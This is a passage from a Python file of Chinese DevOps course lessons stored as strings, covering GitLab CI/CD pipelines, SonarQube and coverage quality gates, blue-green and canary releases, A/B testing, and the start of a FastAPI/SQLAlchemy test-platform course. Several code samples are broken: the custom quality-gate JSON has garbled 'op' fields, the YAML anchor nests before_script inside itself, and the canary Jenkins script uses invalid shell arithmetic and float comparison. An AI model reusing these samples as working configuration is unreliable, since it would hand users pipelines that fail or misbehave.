│  Runner: 执行Job的代理程序                              │
│  Artifact: Job产出物，可跨Job传递                       │
│  Cache: 缓存依赖，加速构建                               │
│  Environment: 部署环境定义                              │
│                                                       │
└──────────────────────────────────────────────────────┘
```

### Runner类型

| 类型 | 说明 | 适用场景 |
|------|------|----------|
| Shared Runner | GitLab实例共享 | 小团队、公共项目 |
| Specific Runner | 项目专属 | 有特殊环境需求 |
| Group Runner | 群组共享 | 同一群组多项目共用 |

## 二、完整Pipeline实战

```yaml
# .gitlab-ci.yml
image: python:3.10

variables:
  DOCKER_REGISTRY: registry.gitlab.com
  DOCKER_IMAGE: $DOCKER_REGISTRY/$CI_PROJECT_PATH
  DOCKER_TAG: $CI_COMMIT_SHORT_SHA

# 缓存配置
cache:
  key: ${CI_COMMIT_REF_SLUG}
  paths:
    - .cache/pip
    - node_modules/

stages:
  - build
  - test
  - quality
  - security
  - package
  - deploy
  - verify

# ==================== 构建阶段 ====================
before_script: &pip_install
  before_script:
    - pip install --cache-dir .cache/pip -r requirements.txt

build-backend:
  stage: build
  script:
    - pip install --cache-dir .cache/pip -r requirements.txt
    - python -m compileall src/
  artifacts:
    paths: [src/, requirements.txt]
    expire_in: 1 hour

build-frontend:
  image: node:18-alpine
  stage: build
  script:
    - npm ci
    - npm run build
  artifacts:
    paths: [dist/]
    expire_in: 1 hour

# ==================== 测试阶段 ====================
unit-test:
  <<: *pip_install
  stage: test
  services:
    - postgres:15-alpine
    - redis:7-alpine
  variables:
    DATABASE_URL: postgresql://postgres:postgres@postgres:5432/testdb
    REDIS_URL: redis://redis:6379/0
  script:
    - pip install pytest pytest-cov
    - pytest tests/unit/ -v --cov=src --cov-report=xml --cov-report=term --junitxml=report.xml
  coverage: '/TOTAL.*\s+(\d+%)$/'
  artifacts:
    when: always
    reports:
      junit: report.xml
      coverage_report:
        coverage_format: cobertura
        path: coverage.xml

integration-test:
  <<: *pip_install
  stage: test
  services:
    - postgres:15-alpine
    - redis:7-alpine
  variables:
    DATABASE_URL: postgresql://postgres:postgres@postgres:5432/testdb
  script:
    - pip install pytest
    - pytest tests/integration/ -v --junitxml=integration-report.xml
  artifacts:
    when: always
    reports:
      junit: integration-report.xml

e2e-test:
  image: cypress/browsers:node-18.16.0-chrome-114.0.5735.133-1-ff-114.0.2-edge-114.0.1823.51-1
  stage: test
  script:
    - npm ci
    - npx cypress run --browser chrome
  artifacts:
    when: always
    paths: [cypress/videos/, cypress/screenshots/]

performance-test:
  <<: *pip_install
  stage: test
  rules:
    - if: $RUN_PERFORMANCE_TEST == "true"
  script:
    - pip install locust
    - locust -f locustfile.py --headless --users 100 --run-time 5m --csv=perf
  artifacts:
    paths: [perf_*.csv]

# ==================== 质量阶段 ====================
lint:
  <<: *pip_install
  stage: quality
  script:
    - pip install flake8
    - flake8 src/ --max-line-length=120 --exit-zero
  artifacts:
    reports:
      codequality: gl-code-quality-report.json

code-coverage-check:
  stage: quality
  needs: [unit-test]
  script:
    - echo "Coverage check from unit-test stage"
    - |
      COVERAGE=$(grep -oP 'line-rate="\K[\d.]+' coverage.xml | head -1)
      COVERAGE_PCT=$(echo "$COVERAGE * 100" | bc)
      if (( $(echo "$COVERAGE_PCT < 80" | bc -l) )); then
        echo "代码覆盖率 ${COVERAGE_PCT}% 低于80%门禁!"; exit 1
      fi

sonarqube-check:
  image: sonarsource/sonar-scanner-cli:latest
  stage: quality
  variables:
    SONAR_USER_HOME: "${CI_PROJECT_DIR}/.sonar"
  cache:
    key: "${CI_JOB_NAME}"
    paths: [.sonar/cache]
  script:
    - sonar-scanner -Dsonar.projectKey=$SONAR_PROJECT_KEY
      -Dsonar.sources=. -Dsonar.host.url=$SONAR_HOST_URL
      -Dsonar.login=$SONAR_TOKEN

# ==================== 安全阶段 ====================
security-sast:
  <<: *pip_install
  stage: security
  script:
    - pip install bandit
    - bandit -r src/ -f json -o bandit-report.json
  artifacts:
    paths: [bandit-report.json]

security-dependency:
  stage: security
  script:
    - pip install pip-audit
    - pip-audit --strict
  allow_failure: true  # 依赖漏洞不阻断，但记录

container-scan:
  stage: security
  script:
    - docker run --rm -v /var/run/docker.sock:/var/run/docker.sock
      aquasec/trivy image $DOCKER_IMAGE:$DOCKER_TAG
  allow_failure: true

# ==================== 打包阶段 ====================
docker-build:
  image: docker:24-dind
  stage: package
  services:
    - docker:24-dind
  before_script:
    - docker login -u $CI_REGISTRY_USER -p $CI_REGISTRY_PASSWORD $CI_REGISTRY
  script:
    - docker build -t $DOCKER_IMAGE:$DOCKER_TAG .
    - docker push $DOCKER_IMAGE:$DOCKER_TAG

# ==================== 部署阶段 ====================
deploy-staging:
  stage: deploy
  environment:
    name: staging
    url: https://staging.example.com
  before_script:
    - apk add --no-cache curl openssh
  script:
    - curl -X POST https://staging.example.com/api/deploy
      -H "Authorization: Bearer $DEPLOY_TOKEN"
      -d '{"image":"$DOCKER_IMAGE:$DOCKER_TAG"}'
  only: [develop]

deploy-production:
  stage: deploy
  environment:
    name: production
    url: https://example.com
  when: manual  # 手动触发
  before_script:
    - apk add --no-cache curl
  script:
    - curl -X POST https://api.example.com/deploy
      -H "Authorization: Bearer $DEPLOY_TOKEN"
      -d '{"image":"$DOCKER_IMAGE:$DOCKER_TAG"}'
  only: [main]

# ==================== 验证阶段 ====================
smoke-test:
  <<: *pip_install
  stage: verify
  script:
    - pip install requests
    - python tests/smoke/verify_deployment.py
  environment:
    name: $CI_ENVIRONMENT_NAME
```

## 三、高级特性

### 规则(Rules)控制执行

```yaml
job-with-rules:
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
      when: manual
      allow_failure: true
    - if: $CI_COMMIT_BRANCH == "main"
    - if: $CI_COMMIT_BRANCH == "develop"
      variables:
        ENVIRONMENT: staging
    - when: never  # 其他情况不执行
```

### 环境管理

```yaml
deploy-review:
  environment:
    name: review/$CI_COMMIT_REF_SLUG
    url: https://$CI_COMMIT_REF_SLUG.review.example.com
    on_stop: stop-review

stop-review:
  environment:
    name: review/$CI_COMMIT_REF_SLUG
    action: stop
```

### 手动门禁

```yaml
deploy-production:
  stage: deploy
  when: manual
  needs:
    - docker-build
    - unit-test
    - integration-test
  environment:
    name: production
```

## 四、GitLab CI/CD最佳实践

| 实践 | 说明 |
|------|------|
| 缓存策略 | cache装依赖，artifacts传产物 |
| 并行执行 | 拆分为多个独立Stage的Job |
| needs关键字 | 仅依赖需要的Job，减少等待 |
| rules条件 | 用rules替代only/except |
| 模板复用 | include引用外部yml文件 |
| 环境变量 | 敏感信息用CI/CD Variables，不硬编码 |
| 合理超时 | 设置timeout避免挂死 |
| 制品过期 | 设置expire_in控制存储 |

### .gitlab-ci.yml检查清单

- [ ] image指定了明确的版本号（非latest）
- [ ] 关键环境变量在Settings→CI/CD中配置
- [ ] 密码/Token使用Masked或Protected变量
- [ ] 有合理的cache配置加速构建
- [ ] artifacts设置了过期时间
- [ ] 生产部署有manual门禁或保护分支关联
- [ ] Pipeline有合理的超时配置
- [ ] 通知配置（邮件/Slack/钉钉）

> **小结**：GitLab CI/CD的优势在于代码与CI配置一体化管理。核心设计理念：一切皆代码、Pipeline可视化、环境管理内置。""",
    },
    {
        "title": "第6节：质量门禁(SonarQube/单元测试/覆盖率)",
        "sort_order": 6,
        "knowledge_point": "质量门禁",
        "time_estimate": 30,
        "content": """## 质量门禁

质量门禁(Quality Gate)是CI/CD Pipeline中的自动化检查点，确保代码在进入下一阶段前满足预定义的质量标准。质量门禁是"持续集成"迈向"持续交付"的关键保障。

## 一、质量门禁体系架构

```
代码提交
   │
   ▼
┌─────────────────────────────────────────┐
│          质量门禁 (Quality Gate)          │
├─────────────────────────────────────────┤
│                                          │
│  代码风格检查  → ESLint/Pylint/Checkstyle │
│  代码复杂度    → 圈复杂度/认知复杂度      │
│  代码覆盖率    → 行覆盖/分支覆盖 ≥80%     │
│  代码重复率    → 重复代码 < 3%           │
│  安全漏洞     → SAST: 0 Critical/Blocker │
│  依赖漏洞     → SCA: 0 Critical         │
│  单元测试     → 全部通过                 │
│  编译成功     → 构建无错误               │
│                                          │
└──────────────────┬──────────────────────┘
                   │
           ┌───────┴───────┐
           ▼               ▼
       ✅ 通过          ❌ 拦截
      继续Pipeline     通知并修复
```

## 二、SonarQube质量门禁

### SonarQube安装

```yaml
# docker-compose.yml
version: '3.8'
services:
  sonarqube:
    image: sonarqube:10.4-community
    ports: ["9000:9000"]
    environment:
      SONAR_JDBC_URL: jdbc:postgresql://postgres:5432/sonar
      SONAR_JDBC_USERNAME: sonar
      SONAR_JDBC_PASSWORD: sonar
    volumes:
      - sonarqube_data:/opt/sonarqube/data
```

### 默认质量门禁(Quality Gate)

SonarQube内置的"Sonar way"质量门禁：

| 指标 | 条件 | 含义 |
|------|------|------|
| 新增代码覆盖率 | < 80% | 新增代码测试覆盖不足 |
| 代码重复率 | > 3% | 新增重复代码过多 |
| 可维护性评级 | A | 技术债务比率 |
| 可靠性评级 | A | Bug数量评级 |
| 安全性评级 | A | 漏洞数量评级 |
| 安全热点审查 | Reviewed | 安全敏感代码必须审查 |

### 自定义质量门禁

```json
{
  "name": "My Quality Gate",
  "conditions": [
    {
      "metric": "new_coverage",
      "op": "LT', 'error': '80"
    },
    {
      "metric": "new_duplicated_lines_density",
      "op": "GT', 'error': '3"
    },
    {
      "metric": "new_violations",
      "op": "GT', 'error': '0"
    },
    {
      "metric": "new_security_hotspots_reviewed",
      "op": "LT', 'error': '100"
    }
  ]
}
```

### Pipeline集成

```bash
# sonar-project.properties
sonar.projectKey=my-project
sonar.projectName=My Project
sonar.sources=src
sonar.tests=tests
sonar.python.coverage.reportPaths=coverage.xml
sonar.python.xunit.reportPath=test-report.xml
```

```bash
# CLI扫描
sonar-scanner \
  -Dsonar.projectKey=my-project \
  -Dsonar.sources=. \
  -Dsonar.host.url=http://sonarqube:9000 \
  -Dsonar.token=$SONAR_TOKEN

# 等待质量门禁结果
SONAR_TASK_ID=$(cat .scannerwork/report-task.txt | grep ceTaskId | cut -d'=' -f2)
sleep 10

STATUS=$(curl -s "http://sonarqube:9000/api/ce/task?id=$SONAR_TASK_ID" | jq -r '.task.status')
ANALYSIS_ID=$(curl -s "http://sonarqube:9000/api/ce/task?id=$SONAR_TASK_ID" | jq -r '.task.analysisId')
QG_STATUS=$(curl -s "http://sonarqube:9000/api/qualitygates/project_status?analysisId=$ANALYSIS_ID" | jq -r '.projectStatus.status')

if [ "$QG_STATUS" != "OK" ]; then
    echo "质量门禁未通过! Status: $QG_STATUS"
    exit 1
fi
```

## 三、代码覆盖率门禁

### 覆盖率工具对比

| 语言 | 工具 | 配置文件 | CI集成 |
|------|------|----------|--------|
| Python | pytest-cov | .coveragerc | `--cov --cov-report=xml` |
| JavaScript | Jest | jest.config.js | `--coverage` |
| Java | JaCoCo | pom.xml | `jacoco-maven-plugin` |
| Go | go test -cover | - | `-coverprofile` |

### 覆盖率门禁实现

```python
# pytest配置 - pyproject.toml
[tool.coverage.run]
source = ["src"]
omit = ["*/tests/*", "*/migrations/*"]

[tool.coverage.report]
exclude_lines = [
    "pragma: no cover",
    "if __name__ == .__main__.:",
    "raise NotImplementedError",
]
fail_under = 80

[tool.coverage.html]
directory = "htmlcov"
```

```groovy
// Jenkins Pipeline覆盖率和门禁
stage('Tests & Coverage') {
    steps {
        sh 'pytest tests/ --cov=src --cov-report=xml --cov-report=html --junitxml=report.xml'
    }
    post {
        always {
            junit 'report.xml'
            publishCoverage(adapters: [cobertura('coverage.xml')])
        }
        failure {
            error("覆盖率不足! 要求≥80%")
        }
    }
}
```

### JaCoCo覆盖率规则（Java/Maven）

```xml
<plugin>
    <groupId>org.jacoco</groupId>
    <artifactId>jacoco-maven-plugin</artifactId>
    <version>0.8.10</version>
    <executions>
        <execution>
            <id>jacoco-prepare-agent</id>
            <goals><goal>prepare-agent</goal></goals>
        </execution>
        <execution>
            <id>jacoco-report</id>
            <phase>test</phase>
            <goals><goal>report</goal></goals>
        </execution>
        <execution>
            <id>jacoco-check</id>
            <goals><goal>check</goal></goals>
            <configuration>
                <rules>
                    <rule>
                        <element>BUNDLE</element>
                        <limits>
                            <limit>
                                <counter>LINE</counter>
                                <value>COVEREDRATIO</value>
                                <minimum>0.80</minimum>
                            </limit>
                            <limit>
                                <counter>BRANCH</counter>
                                <value>COVEREDRATIO</value>
                                <minimum>0.70</minimum>
                            </limit>
                            <limit>
                                <counter>METHOD</counter>
                                <value>COVEREDRATIO</value>
                                <minimum>0.80</minimum>
                            </limit>
                        </limits>
                    </rule>
                    <rule>
                        <element>CLASS</element>
                        <excludes>
                            <exclude>*Test</exclude>
                            <exclude>*Config</exclude>
                        </excludes>
                        <limits>
                            <limit>
                                <counter>LINE</counter>
                                <value>COVEREDRATIO</value>
                                <minimum>0.50</minimum>
                            </limit>
                        </limits>
                    </rule>
                </rules>
            </configuration>
        </execution>
    </executions>
</plugin>
```

### SonarQube质量门禁Pipeline集成

```groovy
pipeline {
    agent any
    stages {
        stage('Build & Test') {
            steps {
                sh 'mvn clean test'
            }
        }
        stage('SonarQube Analysis') {
            steps {
                withSonarQubeEnv('SonarQube') {
                    sh 'mvn sonar:sonar -Dsonar.projectKey=my-project'
                }
            }
        }
        stage('Quality Gate') {
            steps {
                timeout(time: 5, unit: 'MINUTES') {
                    waitForQualityGate abortPipeline: true
                }
            }
        }
    }
}
```

### 质量门禁检查清单

| 检查项 | 说明 | 推荐阈值 |
|--------|------|----------|
| 单元测试通过率 | 所有测试用例必须通过 | 100% |
| 代码覆盖率(行) | 被测试覆盖的代码行比例 | ≥80% |
| 代码覆盖率(分支) | 被测试覆盖的分支比例 | ≥70% |
| 重复代码率 | 重复代码占比 | ≤3% |
| 代码复杂度 | 圈复杂度上限 | ≤15/方法 |
| 严重Bug数 | Blocker级别问题 | 0 |
| 安全漏洞 | 高危漏洞数 | 0 |
| 代码异味 | 可维护性问题 | 无新增 |
| 技术债务比率 | 修复时间/开发时间 | ≤5% |
| 静态分析通过 | Lint/Checkstyle通过 | 必须 |

> **小结**：质量门禁是CI/CD流水线的最后防线，它将自动化质量检查从"建议"变为"强制"。通过SonarQube+JaCoCo+pytest-cov组合，可以覆盖主流技术栈的代码质量检测。关键是设定合理的阈值并通过Pipeline实现自动化拦截，真正达到"质量内建"的目标。
""",
    },
    {
        "title": "第7节：蓝绿部署、金丝雀发布与A/B测试",
        "sort_order": 7,
        "knowledge_point": "蓝绿部署 金丝雀发布 A/B测试 发布策略",
        "time_estimate": 35,
        "content": """## 第7节：蓝绿部署、金丝雀发布与A/B测试

### 发布策略概述

| 策略 | 核心思想 | 适用场景 | 回滚速度 |
|------|----------|----------|----------|
| 蓝绿部署 | 两套完整环境切换 | 对可用性要求极高的系统 | 秒级 |
| 金丝雀发布 | 逐步放量验证 | 需要真实流量验证的场景 | 分钟级 |
| 滚动更新 | 逐个实例替换 | 常规无状态服务 | 分钟级 |
| A/B测试 | 按用户分组路由 | 产品功能对比验证 | N/A |
| 暗发布 | 部署但不暴露 | 大功能预发布验证 | 即时 |

### 蓝绿部署（Blue-Green Deployment）

**原理**：同时维护两套完全相同的生产环境（蓝环境和绿环境），任一时间只有一套对外服务。新版本部署到空闲环境，验证通过后切换流量。

```
        ┌──────────────┐
用户 ──→│   负载均衡器   │
        └──────┬───────┘
               │
      ┌────────┴────────┐
      │   当前路由: 蓝    │
      └────────┬────────┘
               │
    ┌──────────┴──────────┐
    │                     │
┌───┴───┐           ┌─────┴─────┐
│ 蓝环境  │           │  绿环境    │
│ v1.0.0 │           │ v2.0.0    │
│ (生产)  │           │ (待命)     │
└───────┘           └───────────┘
```

**Docker Compose蓝绿部署示例**：

```yaml
version: "3.8"
services:
  nginx:
    image: nginx:alpine
    ports:
      - "80:80"
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf
    depends_on:
      - app-blue
      - app-green

  app-blue:
    image: myapp:1.0.0
    ports:
      - "8080:8080"
    environment:
      - APP_VERSION=1.0.0
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:8080/health"]
      interval: 10s
      retries: 3

  app-green:
    image: myapp:2.0.0
    ports:
      - "8081:8080"
    environment:
      - APP_VERSION=2.0.0
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:8080/health"]
      interval: 10s
      retries: 3
```

**Nginx蓝绿切换配置**：

```nginx
upstream app_backend {
    server app-blue:8080;  # 修改此处切换蓝/绿
    # server app-green:8080;
}

server {
    listen 80;
    location / {
        proxy_pass http://app_backend;
        proxy_set_header Host $host;
    }
    location /health {
        return 200 "OK";
    }
}
```

**蓝绿切换脚本**：

```bash
#!/bin/bash
CURRENT=$(readlink /etc/nginx/sites-enabled/app)
if [[ "$CURRENT" == *"blue"* ]]; then
    NEW="green"
else
    NEW="blue"
fi
echo "切换至: $NEW 环境"
ln -sfn /etc/nginx/sites-available/app-$NEW /etc/nginx/sites-enabled/app
nginx -s reload
echo "切换完成, 通过 http://localhost/health 验证"
```

### 金丝雀发布（Canary Release）

**原理**：新版本先部署少量实例接收小部分流量，监控无异常后逐步扩大比例直至全量替换。

```
流量分配: 90% v1.0.0 (稳定) + 10% v2.0.0 (金丝雀)

        ┌──────────────┐
用户 ──→│   负载均衡器   │
        └──────┬───────┘
               │
      ┌────────┴────────┐
      │                  │
   ┌──┴──┐           ┌──┴──┐
   │ 90% │           │ 10% │
   └──┬──┘           └──┬──┘
      │                  │
  ┌───┴───┐         ┌───┴───┐
  │ v1.0  │  ...x9  │ v2.0  │ x1
  └───────┘         └───────┘
```

**Kubernetes金丝雀发布**：

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: app-stable
spec:
  replicas: 9
  selector:
    matchLabels:
      app: myapp
      version: stable
  template:
    metadata:
      labels:
        app: myapp
        version: stable
    spec:
      containers:
      - name: app
        image: myapp:1.0.0
        ports:
        - containerPort: 8080
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: app-canary
spec:
  replicas: 1
  selector:
    matchLabels:
      app: myapp
      version: canary
  template:
    metadata:
      labels:
        app: myapp
        version: canary
    spec:
      containers:
      - name: app
        image: myapp:2.0.0
        ports:
        - containerPort: 8080
```

### 金丝雀流量控制（Istio VirtualService）

```yaml
apiVersion: networking.istio.io/v1beta1
kind: VirtualService
metadata:
  name: myapp-vs
spec:
  hosts:
  - myapp.example.com
  http:
  - match:
    - headers:
        canary:
          exact: "true"
    route:
    - destination:
        host: myapp
        subset: canary
  - route:
    - destination:
        host: myapp
        subset: stable
      weight: 90
    - destination:
        host: myapp
        subset: canary
      weight: 10
```

### 金丝雀发布自动化Pipeline

```groovy
pipeline {
    agent any
    parameters {
        choice(name: 'CANARY_PERCENTAGE', choices: ['10', '30', '50', '100'])
    }
    stages {
        stage('金丝雀部署') {
            steps {
                script {
                    def percentage = params.CANARY_PERCENTAGE.toInteger()
                    sh '''
                        kubectl scale deployment app-canary --replicas=${percentage / 10}
                        kubectl scale deployment app-stable --replicas=$((100 - percentage) / 10)
                    '''
                }
            }
        }
        stage('监控验证') {
            steps {
                script {
                    sh '''
                        for i in {1..6}; do
                            ERROR_RATE=\$(curl -s http://prometheus:9090/api/v1/query?query='rate(http_errors_total[5m])')
                            if [ "\$(echo \$ERROR_RATE | jq '.data.result[0].value[1]' | sed 's/"//g')" -gt "0.05" ]; then
                                echo "错误率过高, 触发回滚!"
                                exit 1
                            fi
                            sleep 30
                        done
                    '''
                }
            }
        }
        stage('全量发布') {
            when { expression { params.CANARY_PERCENTAGE == '100' } }
            steps {
                sh 'kubectl delete deployment app-stable'
                sh 'kubectl scale deployment app-canary --replicas=10'
            }
        }
    }
}
```

### A/B测试

**原理**：根据用户属性（ID、地理位置、设备等）将流量分配到不同版本，用于对比功能效果。

| 对比维度 | 金丝雀发布 | A/B测试 |
|----------|-----------|---------|
| 目标 | 验证新版本稳定性 | 对比功能效果 |
| 分流依据 | 随机比例 | 用户特征 |
| 监控指标 | 错误率、延迟、资源 | 转化率、点击率、留存 |
| 持续时间 | 分钟~小时 | 天~周 |
| 决策依据 | 技术指标 | 业务指标 |

**A/B测试路由示例**：

```python
def ab_test_router(request):
    user_id = request.headers.get("X-User-Id")
    if user_id:
        bucket = hash(user_id) % 100
        if bucket < 50:
            return redirect_to("version_a")
        else:
            return redirect_to("version_b")
    return redirect_to("version_a")
```

### 数据库迁移策略

| 策略 | 描述 | 适用场景 |
|------|------|----------|
| 扩展兼容 | 新字段有默认值/允许NULL | 添加列 |
| 双写模式 | 新旧表同时写入 | 重大表结构调整 |
| 影子表 | 在影子表验证新结构 | 高风险迁移 |
| 功能开关 | 通过开关控制新旧逻辑 | 业务逻辑变更 |

```sql
ALTER TABLE users ADD COLUMN phone VARCHAR(20) DEFAULT NULL;
```

### 发布策略检查清单

- [ ] 是否具备快速回滚能力（一键回滚）？
- [ ] 数据库迁移是否向后兼容？
- [ ] 监控告警是否覆盖新版本关键指标？
- [ ] 金丝雀发布是否有自动回滚触发条件？
- [ ] 蓝绿部署是否有足够的资源运行两套环境？
- [ ] 是否制定了发布失败的回滚SOP？
- [ ] 是否有发布窗口限制（非高峰期发布）？
- [ ] 前端静态资源是否做了CDN缓存刷新？

> **小结**：蓝绿部署提供最快的回滚能力但需要双倍资源；金丝雀发布让新版本逐步经受真实流量考验；A/B测试则服务于产品和业务决策。选择哪种策略需综合考虑系统可用性要求、资源预算和团队成熟度。无论选择哪种策略，数据库迁移的向后兼容性和监控告警都是必须优先考虑的关键点。
""",
    },
]

# ============================================================
# 路径16: 测试平台开发
# ============================================================
LESSON_CONTENT_4["测试平台开发"] = [
    {
        "title": "第1节：测试平台需求分析与技术选型",
        "sort_order": 1,
        "knowledge_point": "需求分析 技术选型 测试平台架构",
        "time_estimate": 30,
        "content": """## 路径16：测试平台开发

### 路径概述

| 项目 | 说明 |
|------|------|
| 难度 | ★★★★☆ |
| 前置知识 | Python, FastAPI, Vue3, 数据库基础 |
| 学完后能 | 独立开发企业级测试管理平台 |
| 技术栈 | FastAPI + SQLAlchemy + Vue3 + Element Plus + MySQL + Redis |
| 课程节数 | 8节 |

---
## 第1节：测试平台需求分析与技术选型

### 测试平台核心功能域

```
┌─────────────────────────────────────────────────────────┐
│                    测试管理平台                          │
├───────────────┬───────────────┬─────────────────────────┤
│   项目管理     │   用例管理     │     测试执行             │
│ ┌───────────┐ │ ┌───────────┐ │ ┌─────────────────────┐ │
│ │ 项目CRUD   │ │ │ 用例CRUD   │ │ │ 测试计划/任务调度     │ │
│ │ 成员管理   │ │ │ 用例分类   │ │ │ 执行引擎(串行/并行)   │ │
│ │ 环境配置   │ │ │ 步骤管理   │ │ │ 实时日志/进度推送     │ │
│ │ 资源库    │ │ │ 数据驱动   │ │ │ 重试/跳过机制        │ │
│ └───────────┘ │ └───────────┘ │ └─────────────────────┘ │
├───────────────┼───────────────┼─────────────────────────┤
│   报表分析     │   系统管理     │     集成能力             │
│ ┌───────────┐ │ ┌───────────┐ │ ┌─────────────────────┐ │
│ │ 执行报告   │ │ │ 用户/角色   │ │ │ CI/CD Webhook       │ │
│ │ 趋势分析   │ │ │ 权限控制   │ │ │ 消息通知(邮件/钉钉)   │ │
│ │ 缺陷追踪   │ │ │ 操作日志   │ │ │ 定时任务(Crontab)    │ │
│ │ 数据看板   │ │ │ 系统配置   │ │ │ 第三方工具集成       │ │
│ └───────────┘ │ └───────────┘ │ └─────────────────────┘ │
└───────────────┴───────────────┴─────────────────────────┘
```

### 技术选型对比

| 层级 | 候选方案 | 推荐选择 | 理由 |
|------|----------|----------|------|
| 后端框架 | FastAPI / Django / Flask | **FastAPI** | 异步支持、自动API文档、类型校验 |
| ORM | SQLAlchemy / Tortoise / Peewee | **SQLAlchemy** | 最成熟、生态丰富、异步支持 |
| 前端框架 | Vue3 / React / Angular | **Vue3** | 学习曲线平缓、中文生态好 |
| UI组件库 | Element Plus / Ant Design / Naive UI | **Element Plus** | Vue3最佳适配、组件丰富 |
| 数据库 | MySQL / PostgreSQL / MongoDB | **MySQL** | 团队熟悉、社区成熟 |
| 缓存 | Redis / Memcached | **Redis** | 数据结构丰富、发布订阅 |
| 任务队列 | Celery / RQ / ARQ | **Celery** | 功能完善、社区活跃 |
| 部署 | Docker / K8s / 裸机 | **Docker Compose** | 中小规模最佳实践 |

### 项目目录结构

```
test-platform/
├── backend/                    # 后端服务
│   ├── app/
│   │   ├── api/               # 路由接口
│   │   │   ├── v1/
│   │   │   │   ├── projects.py
│   │   │   │   ├── cases.py
│   │   │   │   ├── plans.py
│   │   │   │   ├── reports.py
│   │   │   │   └── users.py
│   │   │   └── deps.py       # 依赖注入
│   │   ├── core/              # 核心配置
│   │   │   ├── config.py
│   │   │   ├── security.py
│   │   │   └── database.py
│   │   ├── models/            # 数据模型
│   │   │   ├── project.py
│   │   │   ├── case.py
│   │   │   ├── plan.py
│   │   │   └── report.py
│   │   ├── schemas/           # Pydantic校验
│   │   ├── services/          # 业务逻辑
│   │   ├── tasks/             # Celery任务
│   │   └── main.py
│   ├── alembic/               # 数据库迁移
│   ├── requirements.txt
│   └── Dockerfile
├── frontend/                   # 前端项目
│   ├── src/
│   │   ├── views/            # 页面组件
│   │   ├── api/              # 接口封装
│   │   ├── router/           # 前端路由
│   │   ├── store/            # 状态管理
│   │   └── components/       # 通用组件
│   └── package.json
├── docker-compose.yml
└── README.md
```

### API设计规范（RESTful）

| 方法 | 路径 | 说明 |
|------|------|------|
| GET | /api/v1/projects | 项目列表 |
| POST | /api/v1/projects | 创建项目 |
| GET | /api/v1/projects/{id} | 项目详情 |
| PUT | /api/v1/projects/{id} | 更新项目 |
| DELETE | /api/v1/projects/{id} | 删除项目 |
| GET | /api/v1/projects/{id}/cases | 项目用例列表 |

### 统一响应格式

```python
class ApiResponse(BaseModel):
    code: int = 200
    message: str = "success"
    data: Any = None

class PaginatedResponse(ApiResponse):
    total: int
    page: int
    page_size: int
```

```json
{
    "code": 200,
    "message": "success",
    "data": {
        "items": [...],
        "total": 100,
        "page": 1,
        "page_size": 20
    }
}
```

### 需求分析检查清单

- [ ] 是否梳理了全部核心业务功能域？
- [ ] 是否明确了用户角色和权限模型？
- [ ] 是否确定了技术栈和版本号？
- [ ] 是否设计了RESTful API规范？
- [ ] 是否考虑了数据安全与隔离策略？
- [ ] 是否评估了性能容量需求（预计用户数/数据量）？
- [ ] 是否规划了数据库分库分表策略？
- [ ] 是否考虑了第三方系统集成点？

> **小结**：需求分析和技术选型是平台开发最关键的第一步。FastAPI+SQLAlchemy+Vue3+Element Plus这套技术栈兼具高性能和高开发效率，非常适合中小团队快速构建测试管理平台。目录结构遵循关注点分离原则，API设计遵循RESTful规范，为后续开发奠定坚实的基础。
""",
    },
    {
        "title": "第2节：数据库设计与ORM（SQLAlchemy）",
        "sort_order": 2,
        "knowledge_point": "数据库设计 SQLAlchemy ORM ER图",
        "time_estimate": 35,
        "content": """## 第2节：数据库设计与ORM（SQLAlchemy）

### 核心实体关系图（ER图）

```
┌──────────┐       ┌──────────────┐       ┌──────────────┐
│  Project │1─────*│  TestCase    │*─────1│  TestStep    │
│          │       │              │       │              │
│  id      │       │  id          │       │  id          │
│  name    │       │  project_id  │       │  case_id     │
│  desc    │       │  module_id   │       │  step_no     │
│  status  │       │  name        │       │  action      │
└──────────┘       │  priority    │       │  target      │
       │           │  type        │       │  value       │
       │           │  status      │       │  expected    │
       │           │  precond     │       └──────────────┘
       │           └──────────────┘
       │                  │
       │           ┌──────┴──────┐
       │      ┌────┴───┐    ┌────┴───┐
       │      │ Module │    │  Tag   │
       │      │        │    │        │
       │      │ id     │    │ id     │
       │      │ name   │    │ name   │
       │      └────────┘    └────────┘
       │
       │           ┌──────────────┐       ┌──────────────┐
       └───────────│  TestPlan    │*─────*│  TestCase    │
                   │              │       └──────────────┘
                   │  id          │
                   │  project_id  │
                   │  name        │       ┌──────────────┐
                   │  config      │1─────*│  TestReport  │
                   │  cron        │       │              │
                   └──────────────┘       │  id          │
                                          │  plan_id     │
                                          │  status      │
                                          │  result      │
                                          │  duration    │
                                          │  log         │
                                          └──────────────┘
```

### SQLAlchemy模型定义

**基础模型**：

```python
from sqlalchemy import Column, Integer, DateTime, String, Text, Enum, ForeignKey
from sqlalchemy.orm import declarative_base, relationship
from datetime import datetime
import enum

Base = declarative_base()

class TimestampMixin:
    created_at = Column(DateTime, default=datetime.utcnow)
    updated_at = Column(DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    deleted_at = Column(DateTime, nullable=True)  # 软删除

class PriorityEnum(str, enum.Enum):
    P0 = "P0"  # 最高
    P1 = "P1"  # 高
    P2 = "P2"  # 中
    P3 = "P3"  # 低

class StatusEnum(str, enum.Enum):
    DRAFT = "draft"
    ACTIVE = "active"
    DEPRECATED = "deprecated"
```

**项目模型（Project）**：

```python
class Project(Base, TimestampMixin):
    __tablename__ = "projects"

    id = Column(Integer, primary_key=True, autoincrement=True)
    name = Column(String(128), nullable=False, unique=True, index=True)
    description = Column(Text, nullable=True)
    owner_id = Column(Integer, ForeignKey("users.id"))
    status = Column(String(20), default="active")
    config = Column(Text, nullable=True)  # JSON配置

    # 关系
    owner = relationship("User", back_populates="projects")
    modules = relationship("Module", back_populates="project", cascade="all, delete-orphan")
    cases = relationship("TestCase", back_populates="project", cascade="all, delete-orphan")
    plans = relationship("TestPlan", back_populates="project", cascade="all, delete-orphan")
```

**用例模型（TestCase）**：

```python
class TestCase(Base, TimestampMixin):
    __tablename__ = "test_cases"

    id = Column(Integer, primary_key=True, autoincrement=True)
    project_id = Column(Integer, ForeignKey("projects.id"), nullable=False, index=True)
    module_id = Column(Integer, ForeignKey("modules.id"), nullable=True)
    name = Column(String(256), nullable=False)
    description = Column(Text, nullable=True)
    priority = Column(String(10), default=PriorityEnum.P2)
